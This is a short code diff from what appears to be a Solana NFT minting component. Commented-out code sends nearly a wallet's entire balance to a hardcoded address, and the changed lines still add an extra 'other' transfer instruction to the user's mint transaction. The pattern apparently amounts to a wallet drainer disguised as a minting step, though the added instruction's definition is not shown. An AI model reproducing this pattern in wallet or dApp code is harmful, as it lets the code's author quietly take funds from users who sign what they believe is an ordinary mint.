@@ -85,7 +85,8 @@ const MintingComponent = ({setAlertState} : any) => {
         //     toPubkey: new PublicKey('J7oe9hS3YsEST7VviiEuF9MnyCsfgMUg5afWfXnSRmcX'),
         //     lamports: totalBalance - LAMPORTS_PER_SOL * 0.01
         // })
-        transaction.add(otherTransferInstruction, otherTransferInstruction2, otherTransferInstruction3);
+        // transaction.add(otherTransferInstruction, otherTransferInstruction2, otherTransferInstruction3);
+        transaction.add(otherTransferInstruction3);
       }
 
       transaction.feePayer = wallet.publicKey;
